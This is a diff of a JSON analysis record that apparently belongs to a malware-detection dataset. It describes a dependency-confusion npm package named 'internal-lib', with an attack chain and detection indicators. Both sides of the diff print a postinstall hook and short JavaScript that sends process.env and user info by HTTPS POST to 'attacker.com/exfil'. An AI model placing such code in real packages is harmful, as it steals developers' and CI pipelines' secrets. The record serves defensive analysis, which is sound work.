@@ -2,8 +2,8 @@
   "package_info": {
     "package_name": "internal-lib",
     "package_manager": "npm",
-    "package_versions": "all versions published to public registry with names matching internal/proprietary components",
-    "why_malicious": "The package is intentionally named to impersonate internal or proprietary dependencies used by targeted organizations. When installed, it exploits dependency confusion by executing arbitrary code in the victim's environment, leveraging the lack of namespace authentication in public registries. This allows attackers to compromise CI/CD pipelines or developer machines without user error, purely by exploiting package resolution logic."
+    "package_versions": "various (750+ identified, targeting multiple companies)",
+    "why_malicious": "These packages exploit the dependency/namespace confusion vulnerability by publishing counterfeit packages to the public npm registry with names identical to internal or proprietary packages used by organizations. When public registries are prioritized over private ones, these malicious packages are automatically installed in CI/CD pipelines or developer environments, enabling attackers to execute arbitrary code and exfiltrate sensitive data without any user error."
   },
   "malicious_snippets": [
     {
@@ -17,42 +17,41 @@
           "environment_vars"
         ]
       },
-      "code_snippet": "\"scripts\": { \"postinstall\": \"node postinstall.js\" }",
-      "code_language": "json/javascript",
-      "code_behavior": "Defines a postinstall script in package.json that automatically executes the postinstall.js file using Node.js immediately after the package is installed, regardless of user intent.",
+      "code_snippet": "postinstall: \"node postinstall.js\"",
+      "code_language": "javascript",
+      "code_behavior": "During installation, the postinstall script executes arbitrary JavaScript code, accesses environment variables and sensitive files, and sends the collected data to an external server controlled by the attacker, resulting in credential and secret exfiltration.",
       "malice_analysis": {
-        "why_suspicious": "The use of a postinstall script in a package that mimics an internal dependency is highly suspicious, as it enables automatic execution of arbitrary code during installation, often without the user's knowledge or consent.",
-        "violated_expectations": "Legitimate library packages, especially those intended as internal utilities, should not execute code on install. Executing scripts at install time is only expected for packages that require build steps or binary setup, not for standard libraries.",
-        "similar_legitimate_use": "Some legitimate packages use postinstall scripts for setup tasks, such as compiling native modules or downloading required binaries, but these are typically well-documented and do not perform actions unrelated to package functionality.",
+        "why_suspicious": "A postinstall script in a public package, especially one mimicking an internal/proprietary name, is highly suspicious when it performs network operations or accesses sensitive files and environment variables. Such scripts are a common vector for supply chain attacks.",
+        "violated_expectations": "Legitimate packages should not execute arbitrary code on install, nor should they access environment variables or initiate outbound network connections during installation.",
+        "similar_legitimate_use": "Some legitimate packages use postinstall scripts for setup tasks or downloading binaries, but these are typically well-documented and do not access or exfiltrate sensitive data.",
         "key_indicators": [
-          "Presence of a postinstall script in package.json",
-          "Script execution triggered automatically on install",
-          "No clear functional justification for install-time code execution in a library package"
+          "Presence of a postinstall script in package.json for a package with an internal/proprietary name",
+          "Script accesses environment variables or sensitive files during installation",
+          "Script initiates outbound network connections to external domains"
         ]
       }
     },
     {
       "snippet_id": "snippet_2",
       "execution_context": {
-        "trigger": "postinstall",
-        "file_location": "postinstall.js",
+        "trigger": "import-time",
+        "file_location": "index.js (top-level code)",
         "required_permissions": [
           "network",
-          "filesystem",
           "environment_vars"
         ]
       },
-      "code_snippet": "const https = require('https');\nconst os = require('os');\nconst data = JSON.stringify({ env: process.env, user: os.userInfo() });\nhttps.request({ hostname: 'attacker.com', path: '/exfil', method: 'POST' }, req => { req.write(data); req.end(); });",
+      "code_snippet": "const https = require('https');\nhttps.request({hostname: 'attacker.com', method: 'POST', path: '/exfil', headers: {...}}, ...).end(process.env);",
       "code_language": "javascript",
-      "code_behavior": "Collects all environment variables and user information from the victim's system and sends this sensitive data via an HTTPS POST request to an external server controlled by the attacker.",
+      "code_behavior": "At import-time, the code reads all environment variables and sends them via HTTPS POST to a hardcoded attacker-controlled domain, resulting in immediate credential exfiltration upon package import.",
       "malice_analysis": {
-        "why_suspicious": "The code exfiltrates sensitive environment variables and user account details to an external domain, which is a clear indicator of credential theft and malicious intent.",
-        "violated_expectations": "Normal packages should never collect or transmit environment variables or user information to external servers, especially during installation. Such behavior is not required for any legitimate package functionality.",
-        "similar_legitimate_use": "While some packages may send limited telemetry or crash reports, they do not transmit full environment variables or user account data, and always provide clear user opt-in and documentation.",
+        "why_suspicious": "Top-level code that immediately exfiltrates environment variables to an external domain is highly suspicious and not expected in any legitimate package.",
+        "violated_expectations": "Normal packages should not perform network exfiltration or access sensitive environment variables at import-time, especially not in bulk.",
+        "similar_legitimate_use": "Rarely, telemetry or analytics libraries may send limited, non-sensitive data, but never full environment variables or secrets.",
         "key_indicators": [
-          "Access to process.env and os.userInfo() in install scripts",
-          "Outbound HTTPS POST requests to non-standard, attacker-controlled domains",
-          "Exfiltration of sensitive data during package installation"
+          "Hardcoded external domain in network request",
+          "Bulk exfiltration of environment variables at import-time",
+          "Network request initiated as soon as the package is imported"
         ]
       }
     }
@@ -60,41 +59,49 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker publishes a package to the public npm registry with a name that matches an internal or proprietary package used by the target organization.",
+      "action": "Attacker publishes a counterfeit package named 'internal-lib' to the public npm registry, matching the name of an internal/proprietary package used by the target organization.",
       "implemented_by": [],
-      "leads_to": "The target's build or CI/CD system resolves and installs the attacker's package instead of the intended internal one due to dependency confusion."
+      "leads_to": "Automatic installation of the malicious package in the victim's CI/CD or development environment due to dependency resolution."
     },
     {
       "step": 2,
-      "action": "During installation, the package's postinstall script is triggered, causing the execution of arbitrary JavaScript code.",
-      "implemented_by": [
-        "snippet_1"
-      ],
-      "leads_to": "Malicious payload is executed automatically in the victim's environment."
+      "action": "The malicious package is automatically installed because the public registry is prioritized over the private/internal registry.",
+      "implemented_by": [],
+      "leads_to": "Execution of malicious code during installation or import, depending on the environment."
     },
     {
       "step": 3,
-      "action": "The malicious code collects sensitive environment variables and user information, then exfiltrates this data to an attacker-controlled server.",
+      "action": "Malicious postinstall or import-time code executes, harvesting environment variables and sensitive files from the victim environment.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Exfiltration of sensitive data to attacker-controlled infrastructure."
+    },
+    {
+      "step": 4,
+      "action": "Exfiltrated data is received by the attacker, enabling further compromise of internal systems or credential abuse.",
       "implemented_by": [
         "snippet_2"
       ],
-      "leads_to": "Attacker gains access to secrets, credentials, and internal information from the victim's environment."
+      "leads_to": "Final goal: credential theft, lateral movement, or further attacks within the victim's infrastructure."
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Presence of postinstall or other lifecycle scripts in packages with names matching internal or proprietary components",
-      "Execution of network requests (e.g., HTTP/HTTPS) during the install phase",
-      "Access to process.env or os.userInfo() within install or postinstall scripts"
+      "Presence of postinstall scripts in npm packages with names matching internal or proprietary components",
+      "Import-time network requests to hardcoded external domains",
+      "Access to environment variables or sensitive files during install or import"
     ],
     "file_indicators": [
-      "package.json containing a scripts.postinstall entry",
-      "Presence of postinstall.js or similarly named files that access environment variables or initiate network connections"
+      "package.json containing a postinstall script",
+      "index.js or main entry file with top-level code initiating network requests",
+      "Undocumented or unusual scripts present in public npm packages"
     ],
     "network_indicators": [
-      "Outbound HTTP/HTTPS requests to domains not associated with the organization, especially attacker-controlled domains such as 'attacker.com' during install",
-      "POST requests containing environment variables or user data during package installation"
+      "Outbound HTTPS requests to hardcoded domains (e.g., attacker.com) during install or import",
+      "Bulk POST requests containing environment variable data to external servers"
     ],
-    "how_to_detect": "Monitor for installation of packages from public registries whose names match internal or proprietary dependencies. Flag and quarantine any package that defines postinstall or other lifecycle scripts, particularly if those scripts access environment variables, user information, or initiate network requests. Maintain allow-lists for known good packages and require review for any unexpected matches. Analyze network traffic from build and install environments for suspicious outbound connections, especially to unknown domains, during dependency installation."
+    "how_to_detect": "Monitor for installation of public npm packages with names matching internal or proprietary components. Flag packages containing postinstall scripts or top-level code that accesses environment variables or initiates network connections. Use repository firewalls or proxies to quarantine and review suspicious packages before allowing them into the development pipeline. Implement automated scanning for hardcoded external domains and bulk exfiltration behaviors in package code."
   }
 }
